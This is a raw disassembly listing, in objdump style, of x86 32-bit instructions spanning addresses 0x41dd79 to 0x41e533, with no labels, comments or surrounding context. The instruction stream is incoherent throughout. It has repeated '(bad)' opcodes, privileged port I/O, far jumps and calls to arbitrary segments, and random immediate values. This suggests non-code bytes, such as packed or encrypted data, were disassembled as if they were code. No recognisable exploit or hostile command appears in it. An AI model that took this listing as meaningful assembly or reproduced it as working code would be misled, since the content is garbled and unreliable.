  41dd79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd7a:	js     0x41ddeb
  41dd7c:	dec    eax
  41dd7d:	dec    edx
  41dd7e:	not    BYTE PTR [ecx-0x6f54ca5f]
  41dd84:	and    al,bl
  41dd86:	inc    ebp
  41dd87:	stos   DWORD PTR es:[edi],eax
  41dd88:	adc    bl,dh
  41dd8a:	xchg   edx,eax
  41dd8b:	or     eax,0xc4723c15
  41dd90:	jmp    0x2a744970
  41dd95:	xchg   ebx,eax
  41dd96:	xchg   ebx,eax
  41dd97:	int    0x23
  41dd99:	mov    al,0x3b
  41dd9b:	adc    eax,0x5a6bc1fd
  41dda0:	push   0x6d
  41dda2:	fistp  DWORD PTR [ebp+0x705ff05c]
  41dda8:	mov    edx,0x2f0d0ec7
  41ddad:	rol    BYTE PTR [esi+ebx*4-0x69],1
  41ddb1:	sbb    eax,0xf16a952a
  41ddb6:	out    dx,al
  41ddb7:	cld    
  41ddb8:	repz inc eax
  41ddba:	pop    edx
  41ddbb:	xchg   edi,eax
  41ddbc:	xchg   ebp,eax
  41ddbd:	jne    0x41dddc
  41ddbf:	push   cs
  41ddc0:	ficomp WORD PTR [ecx+edi*2+0x70666bae]
  41ddc7:	xchg   ebx,eax
  41ddc8:	mov    dl,0xc2
  41ddca:	ins    DWORD PTR es:[edi],dx
  41ddcb:	popa   
  41ddcc:	or     BYTE PTR [edi+0x63d9996e],0xcc
  41ddd3:	fmul   st(6),st
  41ddd5:	(bad)  
  41ddd6:	aad    0x40
  41ddd8:	in     al,dx
  41ddd9:	ja     0x41de0a
  41dddb:	test   eax,0x9519fcf0
  41dde0:	mul    BYTE PTR ds:0xd774e486
  41dde6:	jne    0x41de36
  41dde8:	dec    ecx
  41dde9:	mov    edx,es
  41ddeb:	ins    DWORD PTR es:[edi],dx
  41ddec:	popa   
  41dded:	add    al,0x61
  41ddef:	dec    ebp
  41ddf0:	imul   edx,ebp,0xffffff81
  41ddf3:	or     DWORD PTR [ebx-0x27866fec],ecx
  41ddf9:	arpl   WORD PTR [edi],bp
  41ddfb:	mov    ds:0x43c125ee,eax
  41de00:	mov    ecx,0xb7d1be23
  41de05:	sub    ah,ch
  41de07:	sub    BYTE PTR [edx-0x5e81304],dh
  41de0d:	adc    ebx,DWORD PTR [eax+0x298a6d0e]
  41de13:	ins    DWORD PTR es:[edi],dx
  41de14:	cmc    
  41de15:	push   0xd43387b0
  41de1a:	xchg   edi,eax
  41de1b:	cmc    
  41de1c:	inc    ebx
  41de1d:	push   edx
  41de1e:	call   0x3e66:0x7a84fdb1
  41de25:	mov    eax,ebx
  41de27:	cmp    DWORD PTR ds:0xfba74c3f,esi
  41de2d:	add    DWORD PTR [edi],0x70d33abc
  41de33:	mov    ah,0x8
  41de35:	xchg   esp,eax
  41de36:	mov    eax,ds:0x86d73c7b
  41de3b:	jmp    0xa63:0xeee7347b
  41de42:	ret    
  41de43:	ret    0x274f
  41de46:	jle    0x41deb0
  41de48:	adc    DWORD PTR [ecx-0xc7abbfc],0x8d1d140e
  41de52:	fst    DWORD PTR [edx]
  41de54:	sbb    ebx,DWORD PTR [edx-0x52]
  41de57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de58:	out    dx,al
  41de59:	or     ebx,DWORD PTR [esi+0x844a6f2]
  41de5f:	dec    ecx
  41de60:	hlt    
  41de61:	xchg   BYTE PTR [edi],al
  41de63:	mov    al,0xa7
  41de65:	(bad)  
  41de66:	aaa    
  41de67:	dec    esp
  41de68:	cmp    bh,BYTE PTR [ecx]
  41de6a:	push   edx
  41de6b:	scas   eax,DWORD PTR es:[edi]
  41de6c:	std    
  41de6d:	in     eax,0x7f
  41de6f:	push   es
  41de70:	ret    
  41de71:	stc    
  41de72:	test   DWORD PTR [ebp-0x624f570d],ebp
  41de78:	shl    al,cl
  41de7a:	gs cmp al,0x7a
  41de7d:	fisttp WORD PTR [esi+0x29]
  41de80:	shr    BYTE PTR [eiz*1-0x4ac6691],1
  41de87:	test   dl,bh
  41de89:	sub    ecx,ecx
  41de8b:	aad    0xc2
  41de8d:	mov    esi,0xaf234c3
  41de92:	xchg   edx,eax
  41de93:	div    BYTE PTR [edx]
  41de95:	stc    
  41de96:	loopne 0x41de6b
  41de98:	and    al,0x76
  41de9a:	and    BYTE PTR [ebp-0x4504dfcd],ch
  41dea0:	pop    ss
  41dea1:	pop    ecx
  41dea2:	or     esp,DWORD PTR [eax]
  41dea4:	sbb    al,dh
  41dea6:	xchg   DWORD PTR [ebp-0x78],esp
  41dea9:	cmp    al,bh
  41deab:	pop    esi
  41deac:	aaa    
  41dead:	repnz adc BYTE PTR [eax+0x5c],dh
  41deb1:	mov    ebp,0xad733842
  41deb6:	push   ebx
  41deb7:	mov    bl,0x83
  41deb9:	and    edi,DWORD PTR [esi-0xc07b1af]
  41debf:	sti    
  41dec0:	jmp    0xd30f:0x183eab3b
  41dec7:	lahf   
  41dec8:	mov    al,0xdf
  41deca:	pusha  
  41decb:	or     al,0x61
  41decd:	fwait
  41dece:	pop    ebp
  41decf:	xchg   edx,eax
  41ded0:	mov    cl,0xee
  41ded2:	addr16 dec ch
  41ded5:	inc    edi
  41ded6:	adc    al,dh
  41ded8:	push   cs
  41ded9:	add    BYTE PTR [edi],ah
  41dedb:	ds test edi,0x2287023
  41dee2:	pushf  
  41dee3:	dec    ebp
  41dee4:	imul   esp,DWORD PTR [ebx],0x339f4968
  41deea:	jns    0x41de9c
  41deec:	cs cli 
  41deee:	push   ebp
  41deef:	inc    edx
  41def0:	xchg   edx,eax
  41def1:	retf   
  41def2:	fdiv   QWORD PTR [eax-0x41]
  41def5:	arpl   WORD PTR [edi],si
  41def7:	test   al,0x2f
  41def9:	test   BYTE PTR [esi],0x90
  41defc:	jg     0x41de9c
  41defe:	pop    ebx
  41deff:	outs   dx,DWORD PTR ds:[esi]
  41df00:	jg     0x41ded1
  41df02:	pop    es
  41df03:	jne    0x41df6c
  41df05:	sbb    cl,BYTE PTR [edi+0x2a77df52]
  41df0b:	mov    esp,0xe39e89f0
  41df10:	cmp    eax,0x21269826
  41df15:	aam    0xd3
  41df17:	cmp    eax,0x1bee392c
  41df1c:	shl    DWORD PTR [ecx+0x5ac1c53f],cl
  41df22:	dec    ecx
  41df23:	clc    
  41df24:	mov    edx,0xd0541ec2
  41df29:	aas    
  41df2a:	lock cli 
  41df2c:	inc    ebp
  41df2d:	and    DWORD PTR [esi],0x30
  41df30:	ds repz mov cl,0x8
  41df34:	out    dx,al
  41df35:	xor    eax,0xacd55263
  41df3a:	ja     0x41deea
  41df3c:	push   edi
  41df3d:	loope  0x41df9f
  41df3f:	jl     0x41df6e
  41df41:	fldenv [ecx]
  41df43:	test   ah,bh
  41df45:	add    cl,BYTE PTR [esi]
  41df47:	pop    es
  41df48:	(bad)  
  41df49:	mov    al,0x6f
  41df4b:	mov    al,0x9d
  41df4d:	push   ss
  41df4e:	pushf  
  41df4f:	sub    esp,DWORD PTR [eax+ebp*2+0x2766d84e]
  41df56:	test   DWORD PTR [esi+0x1c340dec],edx
  41df5c:	mov    bl,0x9e
  41df5e:	jl     0x41df34
  41df60:	adc    eax,0x31e89a9f
  41df65:	(bad)  
  41df66:	out    0x44,eax
  41df68:	test   cl,bl
  41df6a:	jmp    0xc728:0xcd2dfb23
  41df71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df72:	nop
  41df73:	test   eax,0x64ad9883
  41df78:	mov    edx,0x61b0bf07
  41df7d:	mov    ds:0xb2ed2a30,al
  41df82:	nop
  41df83:	imul   eax,DWORD PTR [edx-0x76],0xffffff9d
  41df87:	cdq    
  41df88:	je     0x41df22
  41df8a:	es push edi
  41df8c:	pusha  
  41df8d:	and    DWORD PTR [ebx+ecx*4+0x32],ebx
  41df91:	mov    dl,0xe3
  41df93:	push   ebp
  41df94:	push   0x9af1a6f0
  41df99:	repz cdq 
  41df9b:	and    eax,0x4bff9c07
  41dfa0:	icebp  
  41dfa1:	jb     0x41dff3
  41dfa3:	dec    ebp
  41dfa4:	add    BYTE PTR [eax],al
  41dfa6:	cmp    BYTE PTR [eax+edi*1],ah
  41dfa9:	stos   DWORD PTR es:[edi],eax
  41dfaa:	ret    
  41dfab:	pop    DWORD PTR [edx+0x6f]
  41dfae:	cmp    bh,BYTE PTR [ecx-0x63]
  41dfb1:	xlat   BYTE PTR ds:[ebx]
  41dfb2:	mov    ecx,0x84c62450
  41dfb7:	pop    es
  41dfb8:	mov    cl,0x30
  41dfba:	inc    eax
  41dfbb:	and    eax,0x882c4df1
  41dfc0:	stos   DWORD PTR es:[edi],eax
  41dfc1:	xchg   ecx,eax
  41dfc2:	mov    bh,0x2a
  41dfc4:	shr    ecx,1
  41dfc6:	mov    eax,0xd81faf57
  41dfcb:	(bad)  
  41dfcc:	xchg   edi,eax
  41dfcd:	adc    ah,BYTE PTR [edx+0x206feaa5]
  41dfd3:	sub    ebx,DWORD PTR [esi]
  41dfd5:	imul   esp,ebx,0x6f550f2e
  41dfdb:	jecxz  0x41dfa6
  41dfdd:	xlat   BYTE PTR ds:[ebx]
  41dfde:	pop    edx
  41dfdf:	and    bh,BYTE PTR [ebx]
  41dfe1:	push   ebp
  41dfe2:	mov    eax,0xed49b58d
  41dfe7:	xor    edx,DWORD PTR [edi]
  41dfe9:	and    DWORD PTR [edi],edx
  41dfeb:	call   FWORD PTR [ebx+0x4e01c8e3]
  41dff1:	pushf  
  41dff2:	ss push ecx
  41dff4:	cli    
  41dff5:	loope  0x41e057
  41dff7:	inc    esi
  41dff8:	cmp    esp,eax
  41dffa:	pop    esp
  41dffb:	mov    cl,0x52
  41dffd:	mov    esi,DWORD PTR [ebp+esi*8+0x7cd1dad3]
  41e004:	mov    ds:0x98b8a426,eax
  41e009:	rol    BYTE PTR [esi],0x16
  41e00c:	adc    ch,dh
  41e00e:	imul   BYTE PTR [esi+esi*2+0x73]
  41e012:	cmp    eax,0xab9f1235
  41e017:	loopne 0x41e00c
  41e019:	shl    BYTE PTR [edi+0x50f9b19b],0x19
  41e020:	pop    ss
  41e021:	loopne 0x41e09e
  41e023:	xor    eax,0x551a7ba1
  41e028:	dec    ebx
  41e029:	xor    ah,bl
  41e02b:	enter  0x354d,0x75
  41e02f:	pop    ebx
  41e030:	pop    edi
  41e031:	mov    ebx,0xe0cc5db5
  41e036:	sti    
  41e037:	in     eax,dx
  41e038:	add    BYTE PTR [eax+0x6ae18896],dl
  41e03e:	jbe    0x41dfe8
  41e040:	retf   0x85af
  41e043:	jmp    0x41e03c
  41e045:	(bad)  
  41e046:	sbb    edx,DWORD PTR [ecx]
  41e048:	into   
  41e049:	mov    ds:0x23b86500,eax
  41e04e:	sub    ch,BYTE PTR [edx-0x45]
  41e051:	xor    eax,0xc751920d
  41e056:	cmp    ch,dh
  41e058:	in     eax,0x15
  41e05a:	sar    BYTE PTR [esi+ebp*4+0x7d],1
  41e05e:	mov    al,0x5f
  41e060:	sbb    DWORD PTR [esi+0xbfbfaa6],eax
  41e066:	sub    bh,BYTE PTR [esi-0x44]
  41e069:	dec    esi
  41e06a:	cmc    
  41e06b:	repz sbb dl,BYTE PTR [ebx]
  41e06e:	aas    
  41e06f:	dec    ebp
  41e070:	popa   
  41e071:	(bad)  
  41e072:	clc    
  41e073:	pusha  
  41e074:	outs   dx,DWORD PTR ds:[esi]
  41e075:	bound  ebp,QWORD PTR [ecx-0x28b6153a]
  41e07b:	or     ecx,edx
  41e07d:	pop    ebx
  41e07e:	hlt    
  41e07f:	mov    DWORD PTR [edx-0x2f],ebp
  41e082:	jne    0x41e0b7
  41e084:	int    0x46
  41e086:	xor    esi,esi
  41e088:	cdq    
  41e089:	mov    dh,0x56
  41e08b:	and    eax,0xd6b67c1d
  41e090:	xor    al,0x13
  41e092:	daa    
  41e093:	or     BYTE PTR [esp+ecx*4+0x6495ec79],0x1e
  41e09b:	loop   0x41e0b3
  41e09d:	add    ecx,ecx
  41e09f:	xor    BYTE PTR [eax-0x320f366a],0xc6
  41e0a6:	icebp  
  41e0a7:	xor    dl,BYTE PTR [ebx]
  41e0a9:	sbb    eax,DWORD PTR cs:[ebx-0x5c]
  41e0ad:	xchg   ecx,eax
  41e0ae:	push   ecx
  41e0af:	push   ds
  41e0b0:	sub    cl,BYTE PTR [ecx-0x37]
  41e0b3:	lea    edi,[edx+0x46]
  41e0b6:	mov    bl,0x27
  41e0b8:	mov    dl,0xa5
  41e0ba:	dec    cx
  41e0bc:	cmp    DWORD PTR [edi-0x77009dc1],esp
  41e0c2:	mov    esi,0x67c6b064
  41e0c7:	dec    esp
  41e0c8:	adc    esi,DWORD PTR ds:0x15fe40e9
  41e0ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0cf:	mov    eax,0x674fbeba
  41e0d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0d5:	push   ss
  41e0d6:	add    DWORD PTR [ebx+ecx*4-0xe],0xaf555e21
  41e0de:	xchg   esi,eax
  41e0df:	in     eax,dx
  41e0e0:	or     DWORD PTR [edi-0x2f],esi
  41e0e3:	(bad)  [eax]
  41e0e5:	push   eax
  41e0e6:	xchg   ebp,eax
  41e0e7:	sub    al,0x4
  41e0e9:	shr    BYTE PTR [esi+0x230f3acb],cl
  41e0ef:	shl    DWORD PTR [ebx-0xa],0x2c
  41e0f3:	call   0x6595:0xc6fadee
  41e0fa:	call   0xf4c9247a
  41e0ff:	sbb    ebp,edx
  41e101:	adc    ecx,DWORD PTR [eax]
  41e103:	scas   al,BYTE PTR es:[edi]
  41e104:	scas   eax,DWORD PTR es:[edi]
  41e105:	xor    eax,0xc0333622
  41e10a:	or     bh,ch
  41e10c:	pop    ecx
  41e10d:	mov    al,0xd0
  41e10f:	imul   esp,DWORD PTR [ebp+0x74],0xc9cb6b3
  41e116:	adc    dl,dl
  41e118:	xor    dl,BYTE PTR [ebx+0x2fbf23ab]
  41e11e:	jb     0x41e12c
  41e120:	retf   0xca86
  41e123:	fadd   QWORD PTR [eax+0x35770b1b]
  41e129:	pop    ebp
  41e12a:	test   DWORD PTR ss:[ebx-0x6e15babe],esp
  41e131:	fisttp WORD PTR [edi-0xc2bc730]
  41e137:	inc    edi
  41e138:	imul   esi,DWORD PTR [eax+eax*2],0x65
  41e13c:	inc    ebp
  41e13d:	(bad)
  41e140:	int3   
  41e141:	adc    BYTE PTR [eax],cl
  41e143:	cld    
  41e144:	xor    cl,dl
  41e146:	in     eax,0xea
  41e148:	fnstcw WORD PTR [eax-0x327799f5]
  41e14e:	push   edx
  41e14f:	repz mov bh,0xbb
  41e152:	push   ecx
  41e153:	jbe    0x41e1a1
  41e155:	mov    ah,0xe5
  41e157:	loopne 0x41e1cd
  41e159:	cdq    
  41e15a:	hlt    
  41e15b:	jl     0x41e151
  41e15d:	push   cs
  41e15e:	and    cl,BYTE PTR [esi+eax*4+0x1f]
  41e162:	add    ch,ch
  41e164:	mov    esi,0x4b3d942e
  41e169:	push   ebp
  41e16a:	out    dx,al
  41e16b:	xchg   DWORD PTR [edi+0x4f94487e],ecx
  41e171:	call   0x898d:0xcb2f65d4
  41e178:	jmp    0x41e13b
  41e17a:	xor    eax,0x8d8d7863
  41e17f:	mov    eax,0xc86fa868
  41e184:	add    eax,0x57b10923
  41e189:	test   DWORD PTR [ebx+edx*4-0x10],edx
  41e18d:	clc    
  41e18e:	pop    ecx
  41e18f:	dec    edi
  41e190:	mov    DWORD PTR [eax-0x7c],edi
  41e193:	in     al,dx
  41e194:	mov    bh,0xe
  41e196:	loope  0x41e163
  41e198:	and    ax,0xae0f
  41e19c:	and    cl,BYTE PTR [esp+esi*1+0x3e24e8f2]
  41e1a3:	mov    ch,0xd4
  41e1a5:	pop    esp
  41e1a6:	jl     0x41e1e3
  41e1a8:	(bad)  [eax+0x2b]
  41e1ab:	or     ebp,DWORD PTR [edx-0x2a437649]
  41e1b1:	out    0xc4,eax
  41e1b3:	and    BYTE PTR [ecx+0x7],dl
  41e1b6:	(bad)  
  41e1b7:	pushf  
  41e1b8:	dec    esp
  41e1b9:	dec    edx
  41e1ba:	sti    
  41e1bb:	fwait
  41e1bc:	xor    BYTE PTR [ebp-0x1c8c6806],0x1f
  41e1c3:	xor    esi,esp
  41e1c5:	mov    ebx,0x5993ca42
  41e1ca:	or     al,0xb4
  41e1cc:	sub    cl,BYTE PTR [ebx]
  41e1ce:	call   0x2084:0xde230acb
  41e1d5:	xor    BYTE PTR [ecx],cl
  41e1d7:	cmp    DWORD PTR [ebp-0x54eec005],eax
  41e1dd:	inc    ecx
  41e1de:	std    
  41e1df:	outs   dx,DWORD PTR ds:[esi]
  41e1e0:	fdiv   QWORD PTR [ecx-0x33183a1]
  41e1e6:	mov    WORD PTR [edx],?
  41e1e8:	daa    
  41e1e9:	(bad)  
  41e1ea:	jmp    0xd4c3:0xccec0d31
  41e1f1:	(bad)  
  41e1f2:	out    dx,al
  41e1f3:	push   ss
  41e1f4:	adc    DWORD PTR [eax+eax*4],ebx
  41e1f7:	push   cs
  41e1f8:	call   0xa7f99476
  41e1fd:	or     dh,ch
  41e1ff:	test   ebx,0xa7a92de4
  41e205:	aaa    
  41e206:	icebp  
  41e207:	push   eax
  41e208:	clc    
  41e209:	xor    esp,0xfffffffb
  41e20c:	mov    edi,esp
  41e20e:	mov    edi,0x72632de1
  41e213:	push   es
  41e214:	(bad)
  41e219:	inc    ebx
  41e21a:	push   ebp
  41e21b:	ds cmc 
  41e21d:	jecxz  0x41e1c7
  41e21f:	push   esi
  41e220:	inc    ebp
  41e221:	out    dx,eax
  41e222:	lods   eax,DWORD PTR ds:[esi]
  41e223:	fs and al,0x6
  41e226:	mov    ch,0x25
  41e228:	aam    0x39
  41e22a:	adc    DWORD PTR [edi+0x5c0117f7],ebx
  41e230:	push   0xcbbe81f4
  41e235:	idiv   al
  41e237:	scas   al,BYTE PTR es:[edi]
  41e238:	clc    
  41e239:	addr16 pop ss
  41e23b:	adc    DWORD PTR [ecx-0x11],esp
  41e23e:	add    BYTE PTR ds:[edi+0x3f],0x32
  41e243:	retf   
  41e244:	cmc    
  41e245:	adc    BYTE PTR [esi+ebx*4],dl
  41e248:	pop    ebp
  41e249:	push   ss
  41e24a:	stos   DWORD PTR es:[edi],eax
  41e24b:	sahf   
  41e24c:	inc    ebx
  41e24d:	sub    bh,BYTE PTR [esp+ebx*8-0x7f]
  41e251:	ss or  eax,0x93b5358b
  41e257:	adc    bh,al
  41e259:	sbb    bh,BYTE PTR [ebp+eax*2+0x124705f1]
  41e260:	mov    ch,0xa2
  41e262:	jnp    0x41e298
  41e264:	lods   eax,DWORD PTR ds:[esi]
  41e265:	mov    ebp,0x47eb3e12
  41e26a:	or     bl,BYTE PTR [edx+0x6a0a81c7]
  41e270:	test   eax,0xc1572bc7
  41e275:	popa   
  41e276:	mov    ecx,0xbd906fc3
  41e27b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e27c:	outs   dx,BYTE PTR ds:[esi]
  41e27d:	adc    al,0xa0
  41e27f:	add    esp,esp
  41e281:	rol    edi,cl
  41e283:	mov    ch,0x5
  41e285:	sti    
  41e286:	addr16 out dx,al
  41e288:	or     BYTE PTR [esi-0x22ea244c],ch
  41e28e:	pop    ebp
  41e28f:	xchg   ecx,eax
  41e290:	stos   DWORD PTR es:[edi],eax
  41e291:	aad    0x1e
  41e293:	jp     0x41e2f0
  41e295:	push   ebp
  41e296:	fistp  DWORD PTR [ebp+0x40b6f574]
  41e29c:	adc    al,ch
  41e29e:	aam    0x8e
  41e2a0:	jne    0x41e2ea
  41e2a2:	or     BYTE PTR [esi],ah
  41e2a4:	push   cs
  41e2a5:	mov    DWORD PTR ds:0xbd89d828,ebp
  41e2ab:	enter  0x1323,0xec
  41e2af:	mov    ah,BYTE PTR [eax+0x55]
  41e2b2:	pushf  
  41e2b3:	(bad)  
  41e2b4:	mov    edx,0x2aaf5b62
  41e2b9:	push   esp
  41e2ba:	mov    dl,0x4
  41e2bc:	or     al,0xc5
  41e2be:	cwde   
  41e2bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2c0:	adc    BYTE PTR [ebx+0x516cd904],cl
  41e2c6:	or     BYTE PTR [eax-0x22],al
  41e2c9:	lock mov ds:0xd55d4c99,al
  41e2cf:	or     edi,eax
  41e2d1:	dec    esp
  41e2d2:	iret   
  41e2d3:	push   esi
  41e2d4:	jns    0x41e32e
  41e2d6:	xor    eax,0x5caec7
  41e2db:	add    eax,0x8c36a6d7
  41e2e0:	jge    0x41e361
  41e2e2:	jbe    0x41e304
  41e2e4:	sub    al,0x75
  41e2e6:	sub    esp,DWORD PTR [ecx]
  41e2e8:	stos   BYTE PTR es:[edi],al
  41e2e9:	das    
  41e2ea:	(bad)  
  41e2eb:	and    BYTE PTR [ebx+0x62],bh
  41e2ee:	xlat   BYTE PTR ds:[ebx]
  41e2ef:	lods   al,BYTE PTR ds:[esi]
  41e2f0:	add    al,0x30
  41e2f2:	stc    
  41e2f3:	jae    0x41e2c5
  41e2f5:	add    eax,0xaa9841b8
  41e2fa:	enter  0x8002,0xb9
  41e2fe:	sti    
  41e2ff:	sbb    al,0xf5
  41e301:	inc    eax
  41e302:	pop    ecx
  41e303:	repz sbb al,0x3e
  41e306:	loope  0x41e300
  41e308:	mov    al,ds:0x4007c64f
  41e30d:	dec    edx
  41e30e:	rcl    esi,1
  41e310:	dec    eax
  41e312:	stos   BYTE PTR es:[edi],al
  41e313:	aaa    
  41e314:	jno    0x41e2a0
  41e316:	pop    ebp
  41e317:	push   es
  41e318:	mov    al,ds:0xab2490e3
  41e31d:	adc    ch,0xb7
  41e320:	je     0x41e300
  41e322:	lea    esp,[ecx+0x173cff2a]
  41e328:	arpl   sp,di
  41e32a:	xchg   BYTE PTR [ebx-0x6],bl
  41e32d:	add    ebx,ebx
  41e32f:	out    0x5d,al
  41e331:	add    ecx,edx
  41e333:	daa    
  41e334:	(bad)  
  41e335:	faddp  st(0),st
  41e337:	add    ebp,ebp
  41e339:	push   edi
  41e33a:	frstor [ebp+0x253bea03]
  41e340:	sbb    edi,DWORD PTR [edx]
  41e342:	fwait
  41e343:	xor    DWORD PTR [ebp+0xd],0x63
  41e347:	cmp    bl,BYTE PTR [esi-0x4b]
  41e34a:	sub    BYTE PTR [edi+0x50],cl
  41e34d:	lock into 
  41e34f:	div    DWORD PTR [ebx+0x1b]
  41e352:	push   edi
  41e353:	inc    esp
  41e354:	jecxz  0x41e32f
  41e356:	cwde   
  41e357:	adc    al,0x9f
  41e359:	gs (bad) 
  41e35b:	xchg   ecx,eax
  41e35c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e35d:	pop    ecx
  41e35e:	push   ebx
  41e35f:	lods   al,BYTE PTR ds:[esi]
  41e360:	pop    esi
  41e361:	xchg   BYTE PTR [edi-0x69e78801],al
  41e367:	aaa    
  41e368:	(bad)  
  41e36a:	mov    WORD PTR [edx],fs
  41e36c:	cs xchg esi,eax
  41e36e:	jge    0x41e3ed
  41e370:	sub    al,ch
  41e372:	mov    dl,0xdb
  41e374:	jmp    0xe0b6:0x6d34644c
  41e37b:	or     dh,ch
  41e37d:	inc    eax
  41e37e:	add    bl,BYTE PTR ds:0xeef2b4db
  41e384:	scas   al,BYTE PTR es:[edi]
  41e385:	jmp    0x41e405
  41e387:	mov    ebx,0x920500ae
  41e38c:	jo     0x41e3d6
  41e38e:	jge    0x41e3e9
  41e390:	pop    ss
  41e391:	inc    esi
  41e392:	in     al,dx
  41e393:	lock out dx,eax
  41e395:	gs push esp
  41e397:	xchg   esi,eax
  41e398:	mov    bh,0x4a
  41e39a:	dec    ebx
  41e39b:	cmp    esi,DWORD PTR [eax-0x3dfbd019]
  41e3a1:	ins    BYTE PTR es:[edi],dx
  41e3a2:	xor    cl,dh
  41e3a4:	hlt    
  41e3a5:	mov    bl,0xae
  41e3a7:	xchg   edx,eax
  41e3a8:	push   0xffffff9a
  41e3aa:	fmul   DWORD PTR [edx+0x76924484]
  41e3b0:	and    cl,BYTE PTR [ebp-0x3c21c27e]
  41e3b6:	mov    es,esi
  41e3b8:	sar    BYTE PTR [esi-0x7f9cbb96],1
  41e3be:	mov    esp,0x1becc1f
  41e3c3:	adc    BYTE PTR [ebp-0x771a23d6],bh
  41e3c9:	add    ebp,DWORD PTR [eax-0x3]
  41e3cc:	xor    DWORD PTR ds:0xab9b204e,0x2f
  41e3d3:	mov    bh,0x24
  41e3d5:	jmp    0x41e3aa
  41e3d7:	test   DWORD PTR [ebx-0x684233e0],edi
  41e3dd:	arpl   WORD PTR [ebp-0xe0e346],di
  41e3e3:	js     0x41e461
  41e3e5:	mov    ecx,0x71db3ba1
  41e3ea:	inc    esi
  41e3eb:	loope  0x41e376
  41e3ed:	pushf  
  41e3ee:	cmp    al,BYTE PTR [ebx-0x1b]
  41e3f1:	push   0x4f282244
  41e3f6:	sbb    al,0x6d
  41e3f8:	mov    ch,0xd9
  41e3fa:	add    edi,DWORD PTR [esi-0x60e91ca2]
  41e400:	jnp    0x41e446
  41e402:	mov    DWORD PTR [eax],esi
  41e404:	ins    BYTE PTR es:[edi],dx
  41e405:	jmp    0xc1fe:0xfff5296b
  41e40c:	ja     0x41e3f0
  41e40e:	xor    DWORD PTR [eax-0x3472f90f],edi
  41e414:	lods   al,BYTE PTR ds:[esi]
  41e415:	clc    
  41e416:	sahf   
  41e417:	rcr    edx,0x94
  41e41a:	mov    al,ds:0x98aa9d0c
  41e41f:	adc    esp,DWORD PTR [ebp-0x20]
  41e422:	jne    0x41e481
  41e424:	fisubr DWORD PTR [ecx+0x7bff48b]
  41e42a:	loop   0x41e48a
  41e42c:	loope  0x41e433
  41e42e:	out    0xc4,al
  41e430:	int    0xf3
  41e432:	push   ss
  41e433:	xchg   esp,ecx
  41e435:	jae    0x41e3f6
  41e437:	int    0xd9
  41e439:	cmp    BYTE PTR [eax-0x1c],al
  41e43c:	cmp    al,0xea
  41e43e:	xor    ah,cl
  41e440:	ins    BYTE PTR es:[edi],dx
  41e441:	dec    edi
  41e442:	adc    al,0x20
  41e444:	stc    
  41e445:	fs int3 
  41e447:	jmp    0x41e474
  41e449:	pop    ds
  41e44a:	jp     0x41e491
  41e44c:	rol    BYTE PTR [esi],0x35
  41e44f:	js     0x41e403
  41e451:	jae    0x41e430
  41e453:	sbb    DWORD PTR [ecx+0x51496b31],edi
  41e459:	ror    BYTE PTR [edi+0x15303c94],cl
  41e45f:	jbe    0x41e4ce
  41e461:	xor    al,0x9b
  41e463:	stos   DWORD PTR es:[edi],eax
  41e464:	mov    ebx,0xc4e2b07
  41e469:	xchg   edi,eax
  41e46a:	sub    eax,0xabfa0f4
  41e46f:	sub    ecx,DWORD PTR [esi-0x13dc9fa8]
  41e475:	leave  
  41e476:	std    
  41e477:	adc    eax,0x303e949e
  41e47c:	inc    ecx
  41e47d:	fld    st(5)
  41e47f:	shl    BYTE PTR [esi+eax*2],0x63
  41e483:	mov    bl,0x88
  41e485:	sbb    BYTE PTR [esi+0x35d95d20],al
  41e48b:	shl    DWORD PTR ds:0x35dfa6de,1
  41e491:	mov    dh,0xd2
  41e493:	clc    
  41e494:	or     ecx,DWORD PTR [esi]
  41e496:	leave  
  41e497:	dec    edx
  41e498:	jmp    0xce9f6fa0
  41e49d:	sbb    DWORD PTR [edx],ebp
  41e49f:	lea    eax,[esi-0x3282846d]
  41e4a5:	ret    
  41e4a6:	xchg   BYTE PTR [ebx-0x48a2bbcc],cl
  41e4ac:	xlat   BYTE PTR ds:[ebx]
  41e4ad:	leave  
  41e4ae:	into   
  41e4af:	sub    edx,DWORD PTR [ebx+0x16e26da9]
  41e4b5:	sub    al,0xbc
  41e4b7:	pop    ecx
  41e4b8:	rcr    DWORD PTR [ebx+esi*8+0x3d],cl
  41e4bc:	mov    ch,0x62
  41e4be:	or     eax,0xb389e4e7
  41e4c3:	popa   
  41e4c4:	loop   0x41e454
  41e4c6:	popf   
  41e4c7:	fcomp  DWORD PTR [ebp-0x42a1a22]
  41e4cd:	jp     0x41e4aa
  41e4cf:	mov    eax,0xd07ab197
  41e4d4:	jecxz  0x41e503
  41e4d6:	push   esp
  41e4d7:	adc    DWORD PTR [ebx-0x30347b59],eax
  41e4dd:	jns    0x41e557
  41e4df:	xchg   edi,eax
  41e4e0:	lahf   
  41e4e1:	xchg   ebx,eax
  41e4e2:	in     al,0xef
  41e4e4:	fdivr  DWORD PTR ds:0xd7858b5b
  41e4ea:	int    0xa2
  41e4ec:	pop    edx
  41e4ed:	aas    
  41e4ee:	jbe    0x41e491
  41e4f0:	cmp    bh,BYTE PTR [edi+0x5d7aee33]
  41e4f6:	xchg   DWORD PTR [ebp-0x54],esi
  41e4f9:	mov    ch,0x9e
  41e4fb:	stos   DWORD PTR es:[edi],eax
  41e4fc:	shl    DWORD PTR [edx+eax*1-0x28055563],cl
  41e503:	arpl   ax,bx
  41e505:	rcl    DWORD PTR [edx],cl
  41e507:	dec    esi
  41e508:	(bad)  
  41e509:	clc    
  41e50a:	pop    ebp
  41e50b:	shl    DWORD PTR gs:[eax+0x32f56548],cl
  41e512:	ins    BYTE PTR es:[edi],dx
  41e513:	loope  0x41e58b
  41e515:	in     al,0x32
  41e517:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e518:	call   0x6946:0x36bd3c32
  41e51f:	inc    edi
  41e520:	shl    DWORD PTR [ebp+0x5740b05f],1
  41e526:	or     DWORD PTR [edi+0x40],esp
  41e529:	dec    eax
  41e52a:	xchg   ebx,eax
  41e52b:	adc    eax,0xb6b9370
  41e530:	shl    cl,0x5f
  41e533:	mov    bh,0x5c
